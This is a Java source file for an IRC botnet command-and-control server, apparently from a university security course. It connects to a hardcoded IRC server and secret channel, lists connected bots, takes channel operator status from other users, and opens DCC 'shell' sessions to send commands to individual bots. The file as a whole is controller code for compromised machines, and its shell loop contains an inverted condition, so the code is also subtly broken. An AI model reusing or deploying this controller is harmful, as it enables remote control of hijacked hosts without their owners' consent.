import java.io.*;
import java.net.*;
import java.util.*;
import org.jibble.pircbot.*;

public class BotnetServer extends PircBot {
	private static final boolean DEBUG = true;
	private static final String SERVER = "eve.cs.washington.edu";
	private static final String CHANNEL = "#hacktastic";
	private static final String NAME = "RandR";
	private static final int PORT = 6667;
	private static final int TIMEOUT = 120000;
	private Scanner input;
	private boolean inChat;
	private DccChat chat;
	
	public static void main(String[] args) {
		BotnetServer bn = new BotnetServer();
	}
	
	public BotnetServer() {
		input = new Scanner(System.in);
		try {
			setVerbose(DEBUG);
			setName(NAME);
			setMessageDelay(0);
			
			startIdentServer();
			connect(SERVER, PORT);
			
			setMode(CHANNEL, "s");
			input = new Scanner(System.in);
		} catch (NickAlreadyInUseException e) {
			changeNick(NAME);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	protected void onConnect() {
		joinChannel(CHANNEL);
	}
	
	protected void onUserList(String channel, User[] bots) {
		for (int i = 0; i < bots.length; i++) {
			System.out.println("\t" + bots[i].toString());
		}
		init();
	}
	
	protected void onChannelInfo(String channel, int userCount, String topic) {
		System.out.println(channel + " (" + userCount + ")");
	}
	
	protected void onMessage(String channel, String sender, String login, String hostname, String message) {
		System.out.println("<" + sender + ">: " + message);
	}
	
	public void init() {
		System.out.print("Command: ");
		String message = input.nextLine();
		while(!message.toLowerCase().equalsIgnoreCase("q")) {
			write(message);
			System.out.print("Command: ");
			message = input.nextLine();
		}
	}
	
	public void write(String s) {
		if (s.toLowerCase().equals("list")) {
			listChannels();
		} else if (s.toLowerCase().equals("names")) {
			User[] bots = getUsers(CHANNEL);
			for (int i = 0; i < bots.length; i++) {
				System.out.println("\t" + bots[i].toString());
			}
		} else if (s.toLowerCase().equals("setop")) {
			op(CHANNEL, NAME);
			User[] bots = getUsers(CHANNEL);
			for (int i = 0; i < bots.length; i++) {
				System.out.println(bots[i].getNick());
				if (!bots[i].getNick().equals(NAME)) {
					deOp(CHANNEL, bots[i].toString());
				}
			}
			op(CHANNEL, NAME);
		} else if (s.toLowerCase().startsWith("shell")) {
			String[] parts = s.split(" ");
			if (parts.length >= 3) {
				engageInChat(parts[1], Integer.parseInt(parts[2]));
			} else if (parts.length >= 2) {
				engageInChat(parts[1], TIMEOUT);
			} else {
				System.out.println("Shell: requires the nick of the bot to shell into and optional a time to wait");
			}
		} else if (s.startsWith(":")) {
			sendMessage(CHANNEL, s.substring(1));
		} else {
			sendRawLine(s);
		}
	}
	
	private void engageInChat(String botNick, int timeout) {
		chat = dccSendChatRequest(botNick, timeout);
		if (chat != null) {
			System.out.println("Chat successful");
			try {
				chat.readLine();
				String response = input.nextLine();
				while (response.equalsIgnoreCase("quit shell")) {
					chat.sendLine(response);
					System.out.println(chat.readLine());
					response = input.nextLine();
				}
				chat.sendLine(response);
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
	
	protected void onPrivateMessage(String sender, String login, String hostname, String message) {
		//Perhaps this will enable chatting?
	}
}
